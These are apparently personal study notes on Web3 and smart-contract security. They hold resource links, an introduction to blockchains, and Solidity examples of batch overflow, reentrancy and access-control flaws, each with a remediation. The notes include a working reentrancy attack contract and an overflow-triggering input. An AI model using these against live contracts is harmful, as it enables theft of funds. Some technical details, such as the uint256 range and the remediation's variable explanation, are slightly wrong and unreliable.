# Web3 security notes
Personal notes about Web3, Smart Contracts and Blockchains on a security point of view.

**ToDo**
- Imparare di più su Flash Loan Attacks
  - https://www.youtube.com/watch?v=NifGKCiiX3E
  - https://medium.com/coinmonks/how-i-run-a-polygon-node-for-flashloan-bots-71229e1a905d
- Continuare con questa playlist https://www.youtube.com/watch?v=_aXumgdpnPU&list=PLD_RqipW0-9usElaE6DZEkMpzUM2HJv2v&index=6

**Index**
- [Resources](#Resources)
- [Introduction](#Introduction)
- Development
  - [Solidity](https://github.com/seeu-inspace/reference-web3-security/tree/main/solidity)
- Security
- Vulnerabilities
  - [Human errors](#human-errors)
  - [Batch Overflow](#batch-overflow)
  - [Reentrancy Vulnerabilities](#reentrancy-vulnerabilities)
  - [Authorization issues](#authorization-issues)
  - [Use of components with known vulnerabilities](#use-of-components-with-known-vulnerabilities)
- [Tools](#tools)

## Resources

### Courses

- https://www.sans.org/cyber-security-courses/blockchain-smart-contract-security/

### Ethereum

- https://github.com/ethereumbook/ethereumbook
- https://www.youtube.com/channel/UCJWh7F3AFyQ_x01VKzr9eyA/videos
- https://blog.thallo.io/ethers-js-cheatsheet-skip-the-learning-curve-4abc11729d98
- https://medium.com/@shub.sharma350/gas-optimizations-in-smart-contracts-a894768b274c

### Rust

- https://www.youtube.com/watch?v=MsocPEZBd-M

### Vyper

- https://www.youtube.com/watch?v=Y6o9kNqRV2Y&list=PLFPZ8ai7J-iQMTChqif-XVP8DYABA4rx1
- https://github.com/vyperlang/vyper

### Smart Contract Security
- https://consensys.github.io/smart-contract-best-practices/
- https://github.com/ethereumbook/ethereumbook/blob/develop/09smart-contracts-security.asciidfoc
- https://www.youtube.com/playlist?list=PLdJRkA9gCKOONBSlcifqLig_ZTyG_YLqz
- https://github.com/OpenZeppelin/openzeppelin-contracts
- https://arxiv.org/pdf/2008.04761.pdf
- https://ethereum.org/en/developers/docs/smart-contracts/security/
- https://consensys.github.io/smart-contract-best-practices/
- https://www.youtube.com/watch?v=dDispC5aOMs&list=PLS01nW3RtgopsMpAceFwuyLKH42VW0Nw9
- https://www.youtube.com/watch?v=T7VQI5EW6ZY&list=PLS01nW3Rtgoos65Y38qr9is9fqnoJ2tmU
- https://blocksecteam.medium.com/when-safetransfer-becomes-unsafe-lesson-from-the-qbridge-security-incident-c32ecd3ce9da

### Blockchain Penetration Testing
- https://dasp.co/
- https://blog.positive.com/predicting-random-numbers-in-ethereum-smart-contracts-e5358c6b8620
- https://www.youtube.com/playlist?list=PLCwnLq3tOElpIi6Gci36PnvrrS8ljBHkq
- https://www.youtube.com/watch?v=P8LXLoTUJ5g
- https://www.youtube.com/watch?v=WIEessi3ntk
- https://www.youtube.com/watch?v=bTPouSkrhIM
- https://www.youtube.com/watch?v=BZXv3kUygNU
- https://published-prd.lanyonevents.com/published/rsaus19/sessionsFiles/14118/HT-F02_Advanced-Smart-Contract-Hacking-FINAL.pdf > https://www.youtube.com/watch?v=IOUnhCTw6tE
- https://medium.com/@JusDev1988/reentrancy-attack-on-a-smart-contract-677eae1300f2
- https://github.com/smartdec/classification
- https://www.shielder.com/blog/2022/04/a-sneak-peek-into-smart-contracts-reversing-and-emulation/
- https://medium.com/immunefi/hacking-the-blockchain-an-ultimate-guide-4f34b33c6e8b
- https://github.com/crytic/building-secure-contracts/tree/master/program-analysis/echidna#installation
- https://betterprogramming.pub/the-encyclopedia-of-smart-contract-attacks-vulnerabilities-dfc1129fdaac
- https://consensys.github.io/smart-contract-best-practices/known_attacks/
- https://www.youtube.com/watch?v=ozqOlUVKL1s
- https://www.youtube.com/watch?v=WP-EnGhIYEc
- https://www.youtube.com/watch?v=4Mm3BCyHtDY

### Laboratories
- https://www.damnvulnerabledefi.xyz/
  - https://www.youtube.com/watch?v=A5s9aez43Co&list=PLO5VPQH6OWdXKPThrch6U0imGdD3pHLXi 
- https://gitlab.com/badbounty/dvcw
- https://ethernaut.openzeppelin.com/
- https://ctf.paradigm.xyz/
- https://github.com/tinchoabbate/defcon28-talk-challenge
- https://github.com/blockthreat/blocksec-ctfs

### Exploitation / PT examples
- https://github.com/openzeppelin/exploit-uniswap
- https://github.com/tinchoabbate/function-clashing-poc
- https://blog.openzeppelin.com/backdooring-gnosis-safe-multisig-wallets/
- https://blog.openzeppelin.com/security-audits/
- https://mobile.twitter.com/tornadocash/status/1204745639759884289
- https://blog.euler.finance/uniswap-oracle-attack-simulator-42d18adf65af

### Bug Bounty
- https://immunefi.medium.com/
- https://medium.com/immunefi/how-robert-forster-of-armor-finds-big-bugs-36656ab7b82c
- https://blog.yeswehack.com/yeswerhackers/getting-started-smart-contract-bug-bounty/

## Introduction

The **Blockchain** is a set of technologies in which the ledger is structured as a chain of blocks containing transactions and consensus distributed on all nodes of the network. All nodes can participate in the validation process of transactions to be included in the ledger.

There are two types of operations that are carried out to create a cryptocurrency:
- **Mining (Proof-of-Work)** Validation of transactions through the resolution of mathematical problems by miners who use hardware and software dedicated to these operations. Whoever solves the problem first wins the right to add a new block of transactions and a reward;
- **Staking (Proof-of-Staking)** consists of users who lock their tokens in a node called a validator. The validators take turns checking the transactions on the network. If they perform well, they receive a prize distributed among all the participants of the validator, otherwise, they receive a penalty.

**Ethereum** is a blockchain that has popularized an incredible innovation: smart contracts, which are a program or collection of code and data that reside and function in a specific address on the network. Thanks to this factor, it is defined as a "programmable blockchain".

A token can be created with a smart contract. Most of them reside in the ERC20 category, which is fungible tokens. Other tokens are ERC-721 and ERC-1155, aka NFTs.

A **decentralized application**, also known as **DApp**, differs from other applications in that, instead of relying on a server, it uses blockchain technology. To fully interact with a DApp you need a wallet.
DApps are developed both with a user-friendly interface, such as a web, mobile or even desktop app, and with a smart contract on the blockchain. The fact that there is a user-friendly interface means that the "old vulnerabilities" can still be found. An example: If a DApp has a web interface, maybe an [XSS](https://owasp.org/www-community/attacks/xss/) on it can be found and exploited.

The source code of the Smart Contracts is often written in **Solidity**, an object-oriented programming language. Another widely used programming language, but less than Solidity, is **Vyper**, very similar to Python.

Most of the time the smart contract code is found public in a github such as `github.com/org/project/contracts/*.sol` or you can get it from Etherscan, for example by going to the contract address (such as that of the DAI token), in the Contract tab you will find the code https://etherscan.io/address/0x6b175474e89094c44da98b954eedeac495271d0f#code and contract ABI > a json which indicates how the functions of the smart contract are called.
In any case, the source is almost always public. If it's not public, you can use an EVM bytecode decompiler such as https://ethervm.io/decompiler, just enter the contract address here.

## Vulnerabilities

### Human errors

When tested other types of application, an attacker does not generally have access to the backand code accordingly cannot know the names of the parameters to be used, the hidden functions etc. This is not entirely true but the fact that it is not an immediate aspect provides a false sense of security.
For smart contracts, however, this cannot be applied. The code is always public, a function can be private and not directly accessible but it is still readable by anyone.


A smart contract has a cost. A longer code with variables of certain types rather than others increases the expense of setting up the contract on a blockchain. Consequently, programmers try to optimize the code as much as possible. This can bring less safe development to be able to save on costs.


Furthermore, once a smart contract is active it is impossible to make changes. For this reason it is necessary to perform careful security checks to verify that everything is safe.


### Batch Overflow

This happens because the arithmetic value of the operation exceeds the maximum size of the variable value type. An example: the variable `amount` is `uint256`. It supports numeric values from 0 to 2 ^ 256. This means that a value like `0x8000000000000000000000000000000000000000000000000000000000000000` corresponding to the decimal value `57896044618658097711785492504343953926634992332820282019728792003956564819968` received in the input for the variable `amount` would trigger a Batch Overflow since it exceeds the maximum value supported.

A real example of this attack: Beauty Chain exploit https://etherscan.io/tx/0xad89ff16fd1ebe3a0a7cf4ed282302c06626c1af33221ebe0d3a470aba4a660f. Beauty Chain smart contract code: https://etherscan.io/address/0xc5d105e63711398af9bbff092d4b6769c82f793d#code.

The function vulnerable to a Batch Overflow on Beauty Chain is `batchTransfer`.

```
//SPDX-License-Identifier: UNLICENSED
pragma solidity 0.6.6;

contract BEC_Target{

mapping(address => uint) balances;

function batchTransfer(address[] memory _receivers, uint256 _value) public payable returns (bool) {
    uint cnt = _receivers.length;
    uint256 amount = uint256(cnt) * _value;
    require(cnt > 0 && cnt <= 20);
    require(_value > 0 && balances[msg.sender] >= amount);

    balances[msg.sender] = balances[msg.sender] - amount;
    for (uint i = 0; i < cnt; i++) {
        balances[_receivers[i]] = balances[_receivers[i]] + _value;
    }
    return true;
  }

    function deposit() public payable{
        balances[msg.sender] += msg.value;       
    }

    function getBalance() public view returns(uint){
        return balances[msg.sender];
    }

}
```

An input like `["<ADDR_1>","<ADDR_2>"], 0x8000000000000000000000000000000000000000000000000000000000000000` for the function `batchTransfer` would trigger this vulnerability.

**Remediation**

As seen previously, the problem lies in the variable `amount` which, having no input controls, is subject to a Batch Overflow. The solution to this problem is to implement a check on the value received as an input. An example is the following:

```
if (a == 0) return (true, 0);
uint256 c = a * b;
if (c / a != b) return (false, 0);
return (true, c);
```

The variable `uint256 c` is the multiplication of the address of recipient `a` by the value of the number of tokens that must receive `b`, giving the result `c`. To make sure that the value `c` is not Overfloded, we check that the division of `c` / `a` is equal to `b`. If not, it would indicate that the value `c` makes no sense and has been compromised.

To fix this vulnerability, and other integer overflows and underflows, the [SafeMath by OpenZeppelin library](https://github.com/OpenZeppelin/openzeppelin-contracts) can be used. SafeMath provides four functions: Add, Subtract, Multiply, Divide. Each of them performs a check on the operation to verify that the data received in input is valid.

### Reentrancy Vulnerabilities

A Reentrancy vulnerability is a type of attack to drain the bit-by-bit liquidity of a contract with an insecure code-writing pattern.

An incorrect flow first verifies that the user has a sufficient balance to execute the transaction, then sends the funds to the user. Only if the operation is successful, at that point, does it update the user's balance. The problem arises because if a contract invokes this operation instead of a user, it can create code that generates a loop. This means that an attacker can invoke the withdrawal function many times because it is the same balance that is checked as the initial value.

An example:

```
//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.6;
    
contract simpleReentrancy {
	mapping (address => uint) private balances;
	
	function deposit() public payable  {
		require((balances[msg.sender] + msg.value) >= balances[msg.sender]);
		balances[msg.sender] += msg.value;
	}
 
	function withdraw(uint withdrawAmount) public returns (uint) {
		require(withdrawAmount <= balances[msg.sender]);
		msg.sender.call.value(withdrawAmount)("");

		balances[msg.sender] -= withdrawAmount;
		return balances[msg.sender];
	}
    
	function getBalance() public view returns (uint){
		return balances[msg.sender];
	}
}
```

The vulnerable function is `withdraw`. As you can see, first it checks that the balance is sufficient, then the withdrawal is made and only after this step the balance is being updated.

1. An attacker deposits a small amount into his account and calls the withdraw function of the contract by withdrawing an amount less than his balance;
2. The victim contract interacts with the attacker's contract trying to provide the requested funds;
3. The attacker will respond with a fallback function that will call the withdrawal another time, but the victim contract has not yet updated the user's balance so it will keep the initial one despite the previous operation.

An example code of a malicious smart contract is as follows:

```
//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.6;

interface targetInterface{
	function deposit() external payable; 
	function withdraw(uint withdrawAmount) external; 
}
 
contract simpleReentrancyAttack{
	targetInterface bankAddress = targetInterface(TARGET_ADDRESS_HERE); 
	uint amount = 1 ether; 
 
	function deposit() public payable{
		bankAddress.deposit.value(amount)();
	}

	function attack() public payable{
		bankAddress.withdraw(amount); 
	}

	function retrieveStolenFunds() public {
		msg.sender.transfer(address(this).balance);
	}

	fallback () external payable{ 
		if (address(bankAddress).balance >= amount){
			bankAddress.withdraw(amount);
		}   
	}
}
```

1. This contract checks that the balance on the smart contract is greater than 1 ETH. Call the external withdraw function of the victim's smart contract, which will provide the requested funds;
2. Not having received further instructions after receiving the funds, the fallback function is triggered immediately. When the latter is activated, the smart contract has not yet updated the attacker's balance, so it will proceed to carry out the withdrawal operation with the previous balance;
3. The malicious smart contract receives the funds and no further instructions, so it repeats the step 2.


**Remediation**

Implement Checks Effects Interactions Pattern: A secure code-writing pattern that prevents an attacker from creating loops that allow him to re-enter the contract multiple times without blocking.

- Verify that the requirements are met before continuing the execution;
- Update balances and make changes before interacting with an external actor;
- Finally, after the transaction has been validated and the changes have been made, interactions with the external entity are allowed.

### Authorization issues

A function can be: External, Public, Internal or Private. Defining this aspect is very important as there is a risk of allowing potentially harmful operations or giving administrative privileges to any user.

A first example is the following `withdraw` function. As you can see, it does not check if the user requesting a certain amount has the funds to request the withdrawal.

```
function withdraw(uint amount) public payable {
	msg.sender.transfer(amount);
}
```

Another example is the following `kill()` function. The `kill` function contains the method `selfdestruct` that allows to withdraw all the contract funds in the user's balance which activates the functionality and invalidates the smart contract. Since this function is public, any user can have access to it.

```
function kill() public {
	selfdestruct(msg.sender);
}
```

An example of how problematic this can become:

<img src="https://raw.githubusercontent.com/seeu-inspace/reference-web3-security/main/img/eth-noob-kill-function.png" width="50%" height="50%">


**Remediation**

A solution for the first scenario is very simple, it just needs a check to be implemented.

For the second example, you can add the following modifier. In the modifier there is the condition that whoever is carrying out the function must be the owner of the contract.

```
address owner;

modifier OnlyOwner(){
    require(msg.sender == owner);
    
    _;

}
```

So the fixed code would look like this:

```
mapping (address =>uint) balances;
    
address owner;
    
modifier OnlyOwner(){
    require(msg.sender == owner);
    
    _;

}

function kill() public OnlyOwner{
		selfdestruct(msg.sender);
}
```

### Use of components with known vulnerabilities

An outdated compiler with known vulnerabilities may have been used to compile the smart contract. Another possibility is that libraries with known vulnerabilities have been imported.

Another case that I happened to see in the wild is the `import` linking libraries from github then removed. For example, an attempt was made to import SafeMath but the now outdated version was no longer present in the specified endpoint. In this case, some smart contract developers prefer to deploy without having imports that reference external enpoints.

## Tools

### Metamask

Metamask is an application available as an extension for browsers such as Firefox and Google Chrome or even as a mobile app.

It allows you to create a wallet for cryptocurrencies. It can be very useful to use a decentralized application.

To install Metamask go here, and follow the instructions> https://metamask.io/

To connect to a decentralized app (or DApp) the process is often the same for all applications. An example is UniSwap: unlock the Metamask application, press the Connect Wallet button and select Metamask.

<img src="https://raw.githubusercontent.com/seeu-inspace/reference-web3-security/main/img/uniswap-connect.png" width="75%" height="75%">

### [Etherscan.io](https://etherscan.io)

Etherscan.io is the primary reference tool for exploring the Ethereum blockchain.

In a page of a Contract: 
- In Contract Overview you can see the balance in the contract and the balance of Ethereum;
- In More Info we can see the address of the wallet that created the contract and with which transaction. Lastly, the token tracker;
- Below you can see the transactions with method (=> what was done in that transaction), also divided by the various ERC20 tokens and Analytics;
- Another tab is "Contract", where you can see the code of the smart contract, ABI and EVM Bytecode

For other types of addresses (wallet and token tracker) there aren't other relevant details.

### [remix.ethereum.org](https://remix.ethereum.org)

An IDE that provides a compiler, debugger, and various test accounts with some $ETH for each. This is very useful for testing functions without impacting the real Smart Contract target of the tests.

### Infura.io

A very useful tool used by most decentralized apps for backend development of apps on Ethereum. It allows you to easily interact with a node on Ethereum or with IPFS. The most useful tool is especially Infura API.

Once registered in https://infuria.io, go to https://infuria.io/dashboard, click 'Create New Project' at the top right. Once created, you will find yourself in the project settings. In 'Keys' you will see the endpoints to connect to a node on the Ethereum network.

### Ganache

To have a local test node you can use a program called ganache. To install it: `npm install -g ganache-cli`. To run it: `ganache-cli`

### web3.js

web3.js is very useful for interacting with a smart contract and its APIs. Install it by using the command `npm install web3`.

To use it and interact with a contract, use the following commands:
- `node`;
- `const Web3 = require('web3')`;
- `const URL = "http://localhost:8545"`. This is the URL where the contract is deployed, insert the url from Infura.io or Ganache;
- `const web3 = new Web3(URL)`;
- `accounts = web3.eth.getAccounts();`
- `var account`;
- `accounts.then((v) => {(this.account = v[1])})`;
- `const address = "<CONTRACT_ADDRESS>"`. Copy and paste the Contract Address;
- `const abi = <ABI>`. Copy and paste the ABI of the Smart Contract;
- `const contract = new web3.eth.Contract(abi, address)`.

Now you will be able to call the functions from web3.js
